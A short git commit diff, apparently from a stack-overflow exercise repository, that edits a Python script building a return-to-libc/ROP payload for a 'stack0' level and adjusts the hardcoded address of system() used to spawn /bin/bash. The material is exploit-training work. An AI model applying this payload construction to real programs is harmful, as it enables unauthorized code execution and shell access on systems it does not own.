97dcaa54b5e439fe04ffadddc88e9695643d0ce5
vivek-parikh <techblades888@gmail.com>
2017-02-05 12:55:50 +0000

    save arezzo files

--- stack0/stack0_3.py
+++ stack0/stack0_3.py
@@ -5,5 +5,5 @@ payload = b'A' * 72
 payload += struct.pack("<I", 0xB6F52D5C)#rop gadget (pop)
 payload += struct.pack("<I", 0xbefff8c2)#r0=addr of /bin/bash
 payload += b'BBBB'
-payload += struct.pack("<I", 0xb6f28bc4)#address of system
+payload += struct.pack("<I", 0xb6f28bc5)#address of system
 sys.stdout.buffer.write(payload)
